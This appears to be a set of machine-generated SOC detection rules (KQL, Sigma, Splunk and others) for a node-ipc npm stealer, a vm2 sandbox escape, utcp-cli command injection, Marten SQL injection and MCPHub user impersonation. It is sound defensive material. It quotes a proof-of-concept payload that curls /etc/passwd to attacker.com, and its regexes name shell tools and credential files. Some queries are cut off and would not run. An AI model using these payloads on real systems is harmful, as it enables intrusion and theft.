File hash IOCs — endpoint file/process match Installation High
Match SHA256/SHA1/MD5 named in the article against EDR file/process telemetry.
ATT&CKT1027
Data sourcesEndpoint.Filesystem Endpoint.Processes DeviceFileEvents DeviceProcessEvents
// Pre-filter each table BEFORE the union — the engine cannot push
// predicates across `union`, and DeviceFileEvents lacks ProcessCommandLine
// (Initiating only) so column-projection has to differ per side.
union
    ( DeviceFileEvents
        | where Timestamp > ago(7d)
        | where InitiatingProcessAccountName !endswith "$"
        | where SHA256 in~ ("2172dae9a5a695e00e0e4609e7db0207d8566d225f7e815fada246ae995c0f9b") or SHA1 in~ ("2172dae9a5a695e00e0e4609e7db0207d8566d225f7e815fada246ae995c0f9b") or MD5 in~ ("2172dae9a5a695e00e0e4609e7db0207d8566d225f7e815fada246ae995c0f9b")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = InitiatingProcessCommandLine, Source = "DeviceFileEvents" ),
    ( DeviceProcessEvents
        | where Timestamp > ago(7d)
        | where AccountName !endswith "$"
        | where SHA256 in~ ("2172dae9a5a695e00e0e4609e7db0207d8566d225f7e815fada246ae995c0f9b") or SHA1 in~ ("2172dae9a5a695e00e0e4609e7db0207d8566d225f7e815fada246ae995c0f9b") or MD5 in~ ("2172dae9a5a695e00e0e4609e7db0207d8566d225f7e815fada246ae995c0f9b")
        | project Timestamp, DeviceName, ActionType, FileName, FolderPath, SHA256,
                  Cmd = ProcessCommandLine, Source = "DeviceProcessEvents" )
| order by Timestamp desc

// Pre-filter both ASIM tables before the union — same pattern as the
// Defender version so the engine can push hash predicates per-side.
let BadHashes = dynamic(["2172dae9a5a695e00e0e4609e7db0207d8566d225f7e815fada246ae995c0f9b"]);
union
    ( ImFileEvent
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where TargetFileSHA256 in~ (BadHashes)
           or TargetFileSHA1 in~ (BadHashes)
           or TargetFileMD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType,
                  TargetFileName, TargetFilePath, TargetFileSHA256,
                  Cmd = ActingProcessName, Source = "ImFileEvent" ),
    ( ImProcessCreate
        | where TimeGenerated > ago(7d)
        | where ActorUsername !endswith "$"
        | where SHA256 in~ (BadHashes) or SHA1 in~ (BadHashes) or MD5 in~ (BadHashes)
        | project TimeGenerated, DvcHostname, EventType = TargetProcessName,
                  TargetFileName = TargetProcessName, TargetFilePath = TargetProcessName,
                  TargetFileSHA256 = SHA256,
                  Cmd = TargetProcessCommandLine, Source = "ImProcessCreate" )
| order by TimeGenerated desc

[LLM] Outbound egress to node-ipc stealer infrastructure (azurestaticprovider[.]net / 37.16.75.69) Actions on Objectives High
Detects network connections to attacker-owned exfiltration infrastructure used by the malicious node-ipc 9.1.6 / 9.2.3 / 12.0.1 npm packages published 14 May 2026. Any host reaching these atoms after package install should be treated as a credential-theft incident. Rationale: Pivots on two atomic IOCs explicitly named in the Snyk advisory (37.16.75.69 and azurestaticprovider.net), each independently corroborated by StepSecurity and Upwind. No expected legitimate traffic to either atom — attacker-owned exfil infrastructure. Cross-checked against: • https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack • https://www.upwind.io/feed/malicious-node-ipc-npm-package-credential-theft • https://thehackernews.com/2026/05/stealer-backdoor-found-in-3-node-ipc.html

[LLM] DNS lookup for azurestaticprovider[.]net node-ipc exfil domain Command & Control High
Surfaces hosts resolving the attacker-controlled domain azurestaticprovider.net (or sh.azurestaticprovider.net) used by the malicious node-ipc payload, even when the subsequent TCP egress is firewall-blocked. DNS-layer pivot catches hosts that loaded the package but did not complete exfiltration. Rationale: DNS pivot catches the same campaign at an earlier layer than TCP egress and survives proxy-level blocks. Domain is unique to this campaign and referenced verbatim in StepSecurity, Upwind, and Snyk advisories. ContextImageFileName lets the analyst confirm node.exe / npm as the requesting process. Cross-checked against: • https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack • https://www.upwind.io/feed/malicious-node-ipc-npm-package-credential-theft
ATT&CKT1071.004 T1041

DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl has "azurestaticprovider.net"
   or RemoteUrl endswith ".azurestaticprovider.net"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp), Hits=count(),
            SampleProc=any(InitiatingProcessFileName),
            SampleCmd=any(InitiatingProcessCommandLine),
            SampleUser=any(InitiatingProcessAccountName)
            by DeviceName, RemoteUrl
| order by FirstSeen asc
union isfuzzy=true

 | where DnsQuery has "azurestaticprovider.net"
 | project TimeGenerated, SrcIpAddr, SrcHostname, SrcUsername, DnsQuery, DnsResponseName, DnsResponseCodeName, EventProduct)
| order by TimeGenerated asc

[LLM] node-ipc stealer __ntw=1 environment marker in process command line Installation High
Hunts for the __ntw=1 environment-variable marker reportedly used by the malicious node-ipc payload to signal that a child has already inherited the stealer context (preventing re-entry). Presence of this token in any process or child command-line is a high-fidelity indicator the payload executed on the host. Rationale: `__ntw=1` is a campaign-specific environment marker called out verbatim in the Snyk advisory and corroborated by StepSecurity — no mainstream npm package or build tool uses this token. Single-string match on CommandLine works because env vars set inline (e.g. `__ntw=1 node ...`) and parent-spawned children with that prefix surface in EDR command-line telemetry. Cross-checked against: • https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack • https://www.upwind.io/feed/malicious-node-ipc-npm-package-credential-theft
ATT&CKT1059.007 T1027 T1195.002

DeviceProcessEvents

| where ProcessCommandLine has "__ntw=1"
   or InitiatingProcessCommandLine has "__ntw=1"
| project Timestamp, DeviceName, AccountName,
          FileName, FolderPath, ProcessCommandLine,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessFolderPath, InitiatingProcessParentFileName, SHA256
| order by Timestamp desc
union isfuzzy=true
(ImProcessCreate
 | where TimeGenerated > ago(30d)
 | where ActingProcessCommandLine has "__ntw=1"
    or ParentProcessCommandLine has "__ntw=1"
    or TargetProcessCommandLine has "__ntw=1"
 | project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName, ActingProcessCommandLine, ParentProcessName, ParentProcessCommandLine, TargetProcessCommandLine, EventProduct),
(SecurityEvent
 | where TimeGenerated > ago(30d)
 | where EventID == 4688
 | where CommandLine has "__ntw=1" or ParentProcessName has "__ntw=1"
 | project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName, ProcessId)
| order by TimeGenerated desc

[LLM] Malicious node-ipc package landed on disk under node_modules Delivery Medium
Hunts for file-system writes of node-ipc.cjs into any node_modules/node-ipc/ directory after the 14 May 2026 publication window, surfacing developer workstations, CI runners, build containers, and artifact registries that installed a candidate-malicious release. Pair with version triage (9.1.6 / 9.2.3 / 12.0.1). Rationale: Anchors on the exact CommonJS file Snyk identifies as malicious (`node-ipc.cjs`) and the canonical install path (`node_modules/node-ipc/`). Time-bound to the publication window so analysts only see installs that could be the bad versions. Hunting tier because a hit alone does not prove the version is malicious — needs package.json/lockfile triage as Step 1. Cross-checked against: • https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack • https://www.upwind.io/feed/malicious-node-ipc-npm-package-credential-theft • https://thehackernews.com/2026/05/stealer-backdoor-found-in-3-node-ipc.html
ATT&CKT1195.002 T1105
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp >= datetime(2026-05-14T00:00:00Z)
| where ActionType in ("FileCreated","FileModified")
| where FileName =~ "node-ipc.cjs"
| where FolderPath has "node_modules" and FolderPath has "node-ipc"
| project Timestamp, DeviceName, FolderPath, FileName, FileSize, SHA256,
          InitiatingProcessFileName, InitiatingProcessCommandLine,
          InitiatingProcessAccountName, InitiatingProcessFolderPath
| order by Timestamp asc
ImFileEvent
| where TimeGenerated >= datetime(2026-05-14T00:00:00Z)
| where EventType in ("FileCreated","FileModified","FileCreate")
| where TargetFileName =~ "node-ipc.cjs"
| where TargetFilePath has "node_modules" and TargetFilePath has "node-ipc"
| project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, TargetFileName, TargetFileSize, TargetFileSHA256, ActingProcessName, ActingProcessCommandLine, EventProduct
| order by TimeGenerated asc

[LLM] node.js process staging credential dump in nt-* temp directory Actions on Objectives Medium
Detects the staging artefact the malicious node-ipc payload writes — a temp directory matching `$TMPDIR/nt-*` populated by a node process — used to compress harvested SSH / cloud / kube / GitHub / Terraform / shell-history credentials before exfil. Catches the campaign at the collection layer even if egress is firewall-blocked. Rationale: Combines two campaign-specific behaviours from the Snyk advisory: (a) the temp directory prefix `nt-` and (b) a node process as the writer. Threshold of ≥3 distinct files per directory suppresses single-file noise while still firing on the credential-dump fan-out (90+ categories). Catches the campaign at the collection step even when egress is blocked. Cross-checked against: • https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack • https://www.upwind.io/feed/malicious-node-ipc-npm-package-credential-theft
ATT&CKT1074.001 T1552.001 T1560.001
Data sourcesEndpoint.Filesystem
DeviceFileEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName in~ ("node.exe","node")
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FolderPath matches regex @"(?i)([\\/]Temp[\\/]nt-|/tmp/nt-|/var/folders/.+?/T/nt-)"
| summarize FirstSeen=min(Timestamp), LastSeen=max(Timestamp),
            DistinctFiles=dcount(FileName), SampleFiles=make_set(FileName, 25),
            TotalBytes=sum(FileSize)
            by DeviceName, InitiatingProcessAccountName, InitiatingProcessFolderPath, FolderPath
| where DistinctFiles >= 3
| order by FirstSeen asc
ImFileEvent
| where TimeGenerated > ago(30d)
| where ActingProcessName has_any ("node.exe","node")
| where EventType in ("FileCreated","FileModified")
| where TargetFilePath matches regex @"(?i)([\\/]Temp[\\/]nt-|/tmp/nt-|/var/folders/.+?/T/nt-)"
| summarize FirstSeen=min(TimeGenerated), DistinctFiles=dcount(TargetFileName),
            SampleFiles=make_set(TargetFileName, 25), TotalBytes=sum(TargetFileSize)
            by DvcHostname, ActorUsername, TargetFilePath, EventProduct
| where DistinctFiles >= 3
| order by FirstSeen asc
title: Node.js Process Writes to nt-* Temp Directory (node-ipc Stealer Staging)
id: f0c5e842-9a16-4a3d-b71e-2c0d8e5fa317
description: Detects a Node.js process creating files in a temp directory matching the nt-* prefix reportedly used by the malicious node-ipc 9.1.6 / 9.2.3 / 12.0.1 payload to stage harvested credentials before exfiltration.
references:
  - https://snyk.io/blog/malicious-node-ipc-versions-published-npm/
  - https://www.stepsecurity.io/blog/node-ipc-npm-supply-chain-attack
author: SOC Detection Engineering
date: 2026/05/19
tags:
  - attack.collection
  - attack.t1074.001
  - attack.credential_access
  - attack.t1552.001
logsource:
  category: file_event
detection:
  selection_image:
    Image|endswith:
      - '\node.exe'
      - '/node'
  selection_path:
    TargetFilename|contains:
      - '\Temp\nt-'
      - '/tmp/nt-'
      - '/T/nt-'
  condition: selection_image and selection_path
falsepositives:
  - Legitimate Node.js tooling that happens to use an nt- prefix for scratch files (rare)
level: medium

(source:windows.sysmon @EventID:11 @Image:(*\\node.exe OR *\\Node.exe) (@TargetFilename:*\\Temp\\nt-* OR @TargetFilename:*\\AppData\\Local\\Temp\\nt-*)) OR (source:linux.auditd @process.name:node (@file.path:/tmp/nt-* OR @file.path:/var/folders/*/T/nt-*))
#event_simpleName=FileWritten
| ContextImageFileName=/[\\\\/]node(\\.exe)?$/i
| regex("([\\\\/]Temp[\\\\/]nt-|/tmp/nt-|/var/folders/.+?/T/nt-)", field=TargetFileName, flags=i)
| groupBy([aid, ComputerName, UserName, ContextImageFileName], function={
    distinct_count := count(field=TargetFileName, distinct=true)
  })
| distinct_count >= 3
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_name) as files dc(Filesystem.file_name) as file_count from datamodel=Endpoint.Filesystem where (Filesystem.file_path="*\\Temp\\nt-*" OR Filesystem.file_path="*/tmp/nt-*" OR Filesystem.file_path="*/var/folders/*/T/nt-*") AND Filesystem.process_name IN ("node.exe","node") by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.file_path | `drop_dm_object_name(Filesystem)` | where file_count >= 3 | convert ctime(firstTime) ctime(lastTime)
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Filesystem.file_name) as files dc(Filesystem.file_name) as file_count from datamodel=Endpoint.Filesystem where (Filesystem.file_path="*\\Temp\\nt-*" OR Filesystem.file_path="*/tmp/nt-*" OR Filesystem.file_path="*/var/folders/*/T/nt-*") AND Filesystem.process_name IN ("node.exe","node") by Filesystem.dest Filesystem.user Filesystem.process_name Filesystem.file_path | `drop_dm_object_name(Filesystem)` | where file_count >= 3 | convert ctime(firstTime) ctime(lastTime)

[LLM] Vulnerable vm2 npm package (<= 3.11.2) present on host — CVE-2026-45411 Weaponization High
Surfaces hosts that have the vulnerable vm2 package on disk (path-based hunt) and any Defender TVM finding for CVE-2026-45411. The vm2 sandbox is widely embedded in AI/LLM agent backends, low-code platforms, and form-evaluator services to run untrusted JS — locating instances <= 3.11.2 is the prerequisite for prioritising patching against this async-generator escape. Rationale: Path-string `node_modules/vm2/package.json` is the unambiguous file-system footprint of the affected library (CVE only impacts the npm vm2 package). TVM coverage of npm packages is uneven on Windows, so combine TVM with a file-event hunt. Cross-checked against the GHSA advisory and Semgrep/Endor Labs corroboration. Cross-checked against: • https://github.com/patriksimek/vm2/security/advisories/GHSA-248r-7h7q-cr24 • https://nvd.nist.gov/vuln/detail/CVE-2026-45411 • https://semgrep.dev/blog/2026/calling-back-to-vm2-and-escaping-sandbox/ • https://www.bleepingcomputer.com/news/security/critical-vm2-sandbox-bug-lets-attackers-execute-code-on-hosts/

[LLM] Node.js process spawning shell or system utility — likely vm2 sandbox escape Exploitation High
Detects node.exe / node spawning cmd/powershell/sh/bash/touch — the post-escape behaviour shown in the CVE-2026-45411 PoC (`child_process.execSync('touch pwned')`). Server-side Node services that legitimately sandbox untrusted JS via vm2 should not be shelling out; any child-process spawn under such a service after exploit is a high-confidence RCE signal. Rationale: PoC literally invokes `require('child_process').execSync('touch pwned')` after the async-generator escape — `touch`, plus the broader shell/system-utility set, is exactly what an attacker reaches for next. node→shell is rare in production server workloads that exist specifically to sandbox untrusted JS; multiple vendor write-ups (Semgrep, Kodem, Endor Labs) confirm `child_process` spawning from node is the canonical post-vm2-escape behavioural signal. Cross-checked against: • https://github.com/patriksimek/vm2/security/advisories/GHSA-248r-7h7q-cr24 • https://semgrep.dev/blog/2026/calling-back-to-vm2-and-escaping-sandbox/ • https://www.kodemsecurity.com/resources/vm2-sandbox-escape-vulnerabilities-the-2026-cve-wave-turning-ai-agents-into-host-rce-vectors • https://www.endorlabs.com/learn/cve-2026-22709-critical-sandbox-escape-in-vm2-enables-arbitrary-code-execution

[LLM] utcp-cli command injection via UTCP_ARG substitution in python→bash -c CMD_N_OUTPUT script Exploitation High
Detects exploitation of CVE-2026-45369 in utcp-cli ≤ 1.1.1 where a Python parent process spawns /bin/bash -c with the library's signature `CMD_<N>_OUTPUT=$(<cmd> 2>&1)` script template containing unescaped shell metacharacters that indicate injected commands chained after the placeholder. Article-specific: only utcp-cli generates this exact variable-assignment-via-command-substitution pattern, so any presence of `;`, backticks, nested `$()`, pipe-to-shell, or known-bad LOLBins inside the body strongly implies a tool_args injection. Rationale: Built around the exact script template `CMD_<N>_OUTPUT=$(<cmd> 2>&1)` shown in the GHSA's vulnerable-code excerpt — this string only exists in utcp-cli's `_substitute_utcp_args` output. Combined with a python parent → /bin/bash -c (or powershell.exe -Command) child and shell-metacharacter markers from the PoC payload (`; curl http://attacker.com/$(cat /etc/passwd | base64)`), the signature is highly specific to exploitation rather than benign utcp-cli usage. Corroborated against the official UTCP CLI protocol docs (utcp.io/protocols/cli) which confirm the `CMD_N_OUTPUT` and `UTCP_ARG_..._UTCP_END` placeholder semantics. Cross-checked against: • https://github.com/advisories/GHSA-33p6-5jxp-p3x4 • https://www.utcp.io/protocols/cli • https://github.com/universal-tool-calling-protocol/python-utcp • https://pypi.org/project/utcp/
ATT&CKT1059.004 T1190 T1068

| where ProcessCommandLine matches regex @"CMD_\d+_OUTPUT=\$\("      // utcp-cli's signature script template
| extend Substituted = extract(@"CMD_\d+_OUTPUT=\$\(([^)]+)\)", 1, ProcessCommandLine)
| where ProcessCommandLine matches regex @"(?i)(;\s*(curl|wget|nc|bash|sh|python|perl|powershell|base64|chmod|chown)|`[^`]+`|\$\(\s*(cat|curl|wget|whoami|id|uname|hostname|base64|nc)|\|\s*(sh|bash|nc|base64|tee)|>\s*/(tmp|var|dev|etc)|/etc/(passwd|shadow|hosts)|&&\s*(curl|wget|nc|bash))"
| project Timestamp, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, FolderPath, ProcessCommandLine, Substituted, SHA256
| order by Timestamp desc
// Prefer ASIM ImProcessCreate so the rule covers MDE + Sysmon + auditd connectors.
ImProcessCreate
| where TimeGenerated > ago(7d)

title: utcp-cli Command Injection via UTCP_ARG Placeholder Substitution (CVE-2026-45369)
id: 6f8d4e2a-1c9b-4d3f-9a7e-7b3a5c8f1d44
status: experimental
description: |
  Detects exploitation of CVE-2026-45369 in utcp-cli <= 1.1.1. The library generates
  shell scripts of the form `CMD_<N>_OUTPUT=$(<command> 2>&1)` and executes them via
  /bin/bash -c. Unescaped attacker-controlled tool_args allow shell metacharacters
  (;, $(), `, |) to break out of the intended command. This rule fires on a python
  parent spawning bash where the command line carries both the utcp-cli script
  signature and metacharacters indicative of injection.

  - https://github.com/advisories/GHSA-33p6-5jxp-p3x4

    CommandLine|re: '(?i)(;\s*(curl|wget|nc|bash|sh|python|perl|base64|chmod)|`[^`]+`|\$\(\s*(cat|curl|wget|whoami|id|base64|nc)|\|\s*(sh|bash|nc|base64|tee)|/etc/(passwd|shadow|hosts))'

[LLM] Vulnerable utcp-cli package (<= 1.1.1) inventory hunt for CVE-2026-45369 Reconnaissance High
Identifies hosts with utcp-cli at vulnerable versions (≤ 1.1.1, fixed in 1.1.2) so SOC can drive patching ahead of exploitation. Article-specific because the fix is a precise minor-version bump and the affected package name is unique to the Universal Tool Calling Protocol Python CLI plugin. Rationale: Anchored to the exact patched version stated in the advisory (`utcp-cli >= 1.1.2`) and the unique package name. The Defender TVM and Sentinel TVM tables give authoritative inventory; the auxiliary process-cmdline branch covers hosts running utcp-cli inside venvs that TVM may not have catalogued. Sigma is omitted because vulnerability-inventory detection is not a single-event-shape process-creation rule. Corroborated against the package's PyPI page and the official UTCP project repo, which confirm the version line and CLI plugin location matches `plugins/communication_protocols/cli/`. Cross-checked against: • https://github.com/advisories/GHSA-33p6-5jxp-p3x4 • https://pypi.org/project/utcp/ • https://github.com/universal-tool-calling-protocol/python-utcp
ATT&CKT1190 T1059.006
Data sourcesEndpoint.Processes
// Approach A — TVM software inventory (fast, no host scan)
DeviceTvmSoftwareInventory
| where SoftwareVendor in~ ("universal-tool-calling-protocol","utcp","pypi")
| where SoftwareName has "utcp" and SoftwareName has "cli"
| extend V = split(SoftwareVersion, ".")
| extend Major = toint(V[0]), Minor = toint(V[1]), Patch = toint(V[2])
| where Major < 1 or (Major == 1 and Minor == 0) or (Major == 1 and Minor == 1 and Patch <= 1)
| project DeviceName, OSPlatform, SoftwareName, SoftwareVersion
| union (
    // Approach B — fallback: pip install / runtime invocation evidence
    DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where InitiatingProcessFileName matches regex @"(?i)^(pip3?|python(3(\.\d+)?)?)(\.exe)?$"
        or FileName matches regex @"(?i)^(pip3?|python(3(\.\d+)?)?)(\.exe)?$"
    | where ProcessCommandLine has_any ("utcp_cli","utcp-cli")
    | summarize Hosts = make_set(DeviceName), LastSeen = max(Timestamp), SampleCmd = any(ProcessCommandLine) by FileName
    | mv-expand DeviceName = Hosts to typeof(string)
    | project DeviceName, OSPlatform="", SoftwareName="utcp-cli (cmdline-evidence)", SoftwareVersion=tostring(SampleCmd)
)
| order by DeviceName asc
DeviceTvmSoftwareVulnerabilities
| where TimeGenerated > ago(7d)
| where CveId == "CVE-2026-45369"
| project TimeGenerated, DeviceName, OSPlatform, OSVersion, SoftwareVendor, SoftwareName, SoftwareVersion, VulnerabilitySeverityLevel, RecommendedSecurityUpdate

)

| order by DeviceName asc

[LLM] Marten CVE-2026-45288 regConfig SQL injection attempt in web traffic Exploitation High
Detects HTTP requests carrying the high-fidelity Marten full-text-search regConfig SQL injection signature. The PostgreSQL `::regconfig` type-cast literal, `to_tsvector('` fragment, and DDL/DML targeting Marten's `mt_doc_*` document tables are essentially never present in benign user input, making this near-zero-FP exploitation telemetry. Rationale: The `::regconfig` PostgreSQL type-cast literal is the exact fragment Marten's `FullTextWhereFragment.cs` interpolates around the user-supplied regConfig value (per the patched source and PR #4343). It cannot appear in legitimate URL query strings because no client UI emits a PostgreSQL type cast. Paired with `to_tsvector('`, `pg_sleep(`, and the Marten-specific `mt_doc_` table prefix, this is near-zero-FP exploitation telemetry. Corroborated against the canonical advisory and Marten source. Cross-checked against: • https://github.com/advisories/GHSA-vmw2-qwm8-x84c • https://github.com/JasperFx/marten/pull/4343 • https://github.com/JasperFx/marten/blob/master/src/Marten/Linq/SqlGeneration/Filters/FullTextWhereFragment.cs
ATT&CKT1190 T1059

[LLM] Vulnerable Marten library (CVE-2026-45288) present on host — proactive exposure hunt Reconnaissance Medium
Hunting query that identifies hosts running a vulnerable Marten NuGet library (<= 8.36) so the SOC can scope CVE-2026-45288 exposure and drive patching to 8.36.1+. Combines Defender TVM vulnerability data with on-disk Marten.dll discovery for hosts that TVM doesn't enumerate (build agents, dev workstations, self-hosted .NET app servers). Rationale: Marten is distributed as `Marten.dll` (the canonical NuGet artifact name) and is the only library exposing the vulnerable `FullTextWhereFragment` SQL builder. Microsoft's TVM does not consistently inventory NuGet packages, so the FileEvent/FileWritten fallback catches build agents and self-hosted .NET app servers that wouldn't show up in `DeviceTvmSoftwareVulnerabilities`. SOC pivot: once a host hits, manually confirm version via the application's `*.deps.json` / `packages.lock.json` (the file lookup doesn't include version metadata). Cross-checked against: • https://github.com/advisories/GHSA-vmw2-qwm8-x84c • https://www.nuget.org/packages/Marten
ATT&CKT1190

[LLM] Marten CVE-2026-45288 injection observed executing in PostgreSQL audit log Exploitation High
Detects PostgreSQL server-side log entries that contain the Marten full-text-search SQL signature (`to_tsvector('`) interleaved with attacker-injected payloads (`pg_sleep(`, DDL against `mt_doc_*`, appended SELECT statements). This catches successful exploitation that reached the DB, including via app paths that don't traverse the perimeter WAF. Rationale: Per the GHSA advisory and patched `FullTextWhereFragment.cs`, every Marten full-text-search call emits SQL of shape `to_tsvector('<regConfig>'::regconfig, <data>) @@ ...('<regConfig>'::regconfig, ?)`. The verbatim `to_tsvector('` plus the article's PoC payload fragments (`pg_sleep`, `DROP TABLE mt_doc_`, `'::text);`) in the same log line means the injection successfully reached PostgreSQL's parser. The `mt_doc_` document-table prefix is specific to Marten's storage convention (corroborated via Marten's own full-text-index integration tests). Defender XDR and Falcon FDR do not ingest PostgreSQL server logs so those fields are empty. Cross-checked against: • https://github.com/advisories/GHSA-vmw2-qwm8-x84c • https://github.com/JasperFx/marten/pull/4343 • https://github.com/JasperFx/marten/blob/master/src/DocumentDbTests/Indexes/full_text_index.cs
ATT&CKT1190 T1059

union isfuzzy=true

    | where TimeGenerated > ago(LookbackDays)

[LLM] MCPHub SSE endpoint accessed with arbitrary username in URL path (CVE-2025/GHSA-wf8q-wvv8-p8jf hunt) Exploitation Medium
Hunts the vulnerable MCPHub URL pattern `/<user>/sse[/<group>]` on web access logs. Because the username segment is taken straight from the path with no auth, any GET to this pattern from a low-volume / non-allow-listed source — or with an unusual `<user>` token — is the primary spoofing signal pre-patch (< 0.12.15). Rationale: Lifted the literal vulnerable route `/:user/sse/:group(.*)?` from src/server.ts (lines 132-161) and the PoC URL `http://TARGET:3100/CEO-admin-impersonated/sse` directly. Cross-checked at cvereports.com and vulert.com — both confirm the URL shape is the attack surface and that any unauthenticated GET to it creates a session. Defender XDR has no native web-access table for an internal Node.js app, hence empty defender_kql. Cross-checked against: • https://github.com/advisories/GHSA-wf8q-wvv8-p8jf • https://cvereports.com/reports/GHSA-WF8Q-WVV8-P8JF • https://vulert.com/vuln-db/-samanhappy-mcphub--sse-endpoint-accepts-arbitrary-username-from-url-path-without-authentication--en---
ATT&CKT1190 T1078
Data sourcesWeb
// MCPHub SSE impersonation pattern — pre-patch (< 0.12.15)
// Username taken straight from URL path; any GET to /<user>/sse[/<group>] is the attack shape.
union isfuzzy=true
  (W3CIISLog
   | where TimeGenerated > ago(7d)
   | where csMethod == "GET"
   | where csUriStem matches regex @"^/[^/]+/sse(/.*)?$"
   | extend UserSegment = extract(@"^/([^/]+)/sse", 1, csUriStem)
   | extend SourceTable = "W3CIISLog", SrcIP = cIP, Url = strcat(csUriStem, iff(isnotempty(csUriQuery), strcat("?", csUriQuery), "")), Method = csMethod, Status = tostring(scStatus), UA = csUserAgent),
  (CommonSecurityLog
   | where TimeGenerated > ago(7d)
   | where RequestMethod =~ "GET"
   | where RequestURL matches regex @"(?i)^(?:https?://[^/]+)?/[^/?]+/sse(?:/[^?]*)?(?:\?.*)?$"
   | extend UserSegment = extract(@"(?i)/([^/]+)/sse", 1, RequestURL)
   | extend SourceTable = "CommonSecurityLog", SrcIP = SourceIP, Url = RequestURL, Method = RequestMethod, Status = tostring(EventOutcome), UA = RequestClientApplication)
| where isnotempty(UserSegment)
| where UserSegment !in~ ("api","static","assets","health","favicon.ico","robots.txt","_next","public")
| project TimeGenerated, SourceTable, SrcIP, Computer, Method, Url, UserSegment, Status, UA
| order by TimeGenerated desc

[LLM] MCPHub identity spoofing — admin-themed username in /<user>/sse path Exploitation High
High-fidelity alert for GHSA-wf8q-wvv8-p8jf exploitation: requests to MCPHub `/<user>/sse` where the user-segment matches privileged-role keywords (admin, administrator, root, sudo, owner, superuser, sysadmin, ceo, cfo, cto, operator) or the literal PoC string `CEO-admin-impersonated`. Because the segment is taken verbatim as the authenticated identity, an admin-themed token in the path is the cleanest impersonation tell. Rationale: Anchored on the PoC's literal `CEO-admin-impersonated` segment plus the documented impact: 'Impersonate any user, including administrators.' Privileged-role tokens in the URL segment are the highest-signal impersonation indicator because the vulnerable middleware uses the segment verbatim as `IUser.username`. Corroborated against vulert.com and cvereports.com which both echo the admin-impersonation impact. Cross-checked against: • https://github.com/advisories/GHSA-wf8q-wvv8-p8jf • https://vulert.com/vuln-db/-samanhappy-mcphub--sse-endpoint-accepts-arbitrary-username-from-url-path-without-authentication--en---
ATT&CKT1190 T1078.003 T1078

// MCPHub admin-themed identity spoofing (GHSA-wf8q-wvv8-p8jf)
let AdminTokens = dynamic(["admin","administrator","root","sudo","owner","superuser","sysadmin","ceo","cfo","cto","cio","operator","god","impersonated"]);
union isfuzzy=true
  (W3CIISLog
   | where TimeGenerated > ago(7d)
   | where csMethod == "GET"
   | where csUriStem matches regex @"^/[^/]+/sse(/.*)?$"
   | extend UserSegment = tolower(extract(@"^/([^/]+)/sse", 1, csUriStem))
   | extend SrcIP = cIP, Url = csUriStem, UA = csUserAgent, SourceTable="W3CIISLog"),
  (CommonSecurityLog
   | where TimeGenerated > ago(7d)
   | where RequestMethod =~ "GET"
   | where RequestURL matches regex @"(?i)^(?:https?://[^/]+)?/[^/?]+/sse(?:/[^?]*)?(?:\?.*)?$"
   | extend UserSegment = tolower(extract(@"(?i)/([^/]+)/sse", 1, RequestURL))
   | extend SrcIP = SourceIP, Url = RequestURL, UA = RequestClientApplication, SourceTable="CommonSecurityLog")
| where isnotempty(UserSegment)
| mv-apply tok = AdminTokens to typeof(string) on (
    where UserSegment contains tok
    | summarize MatchedTokens = make_set(tok)
  )
| where array_length(MatchedTokens) > 0
| project TimeGenerated, SourceTable, SrcIP, Computer, Url, UserSegment, MatchedTokens, UA
| order by TimeGenerated desc

[LLM] MCPHub SSE user-segment fan-out — single source spawning sessions under multiple usernames Reconnaissance High
Detects a single source IP creating MCPHub SSE sessions under three or more distinct `<user>` URL segments within a 10-minute window — the textbook impersonation-probing / user-enumeration pattern enabled by GHSA-wf8q-wvv8-p8jf. Legitimate clients connect under one identity per host. Rationale: Threshold-based: legitimate MCPHub clients connect under one consistent username per host. A SrcIP cycling through 3+ distinct `<user>/sse` segments in 10m is enumeration / impersonation probing — the only realistic explanation given the article's documented `req.params.user` design flaw. Sigma omitted because this is a cross-event aggregation. Datadog query is filter-only; the count/dcount threshold is enforced in the Cloud SIEM rule wrapper (groupBy SrcIP, count_unique UserSegment >= 3). Cross-checked against: • https://github.com/advisories/GHSA-wf8q-wvv8-p8jf • https://cvereports.com/reports/GHSA-WF8Q-WVV8-P8JF
ATT&CKT1087 T1190 T1078
Data sourcesWeb
// MCPHub user-segment fan-out — single SrcIP, multiple distinct <user>/sse spoof attempts in 10m
let WindowSize = 10m;
union isfuzzy=true
  (W3CIISLog
   | where TimeGenerated > ago(7d)
   | where csMethod == "GET"
   | where csUriStem matches regex @"^/[^/]+/sse(/.*)?$"
   | extend UserSegment = tolower(extract(@"^/([^/]+)/sse", 1, csUriStem)), SrcIP = cIP, Url = csUriStem, SourceTable="W3CIISLog"),
  (CommonSecurityLog
   | where TimeGenerated > ago(7d)
   | where RequestMethod =~ "GET"
   | where RequestURL matches regex @"(?i)^(?:https?://[^/]+)?/[^/?]+/sse(?:/[^?]*)?(?:\?.*)?$"
   | extend UserSegment = tolower(extract(@"(?i)/([^/]+)/sse", 1, RequestURL)), SrcIP = SourceIP, Url = RequestURL, SourceTable="CommonSecurityLog")
| where isnotempty(UserSegment)
| where UserSegment !in~ ("api","static","assets","health","favicon.ico","_next","public")
| summarize
    DistinctUsers = dcount(UserSegment),
    ObservedUsers = make_set(UserSegment, 30),
    Hits = count(),
